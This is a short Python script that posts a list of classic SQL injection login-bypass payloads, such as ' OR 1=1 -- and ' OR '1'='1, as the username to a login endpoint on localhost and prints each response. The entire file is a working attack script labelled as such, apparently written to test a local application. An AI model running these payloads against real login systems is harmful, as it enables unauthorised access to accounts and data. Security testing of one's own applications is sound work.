import requests

API_URL = "http://127.0.0.1:8000/login"

def sql_injection_attack():
    print("Starting SQL Injection attack...\n")

    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "' OR ''='",
        "' OR 1=1#"
    ]

    for payload in payloads:
        print(f"Trying payload: {payload}")

        response = requests.post(
            API_URL,
            params={
                "username": payload,
                "password": "anything"
            }
        )

        print("Response:", response.json(), "\n")

if __name__ == "__main__":
    sql_injection_attack()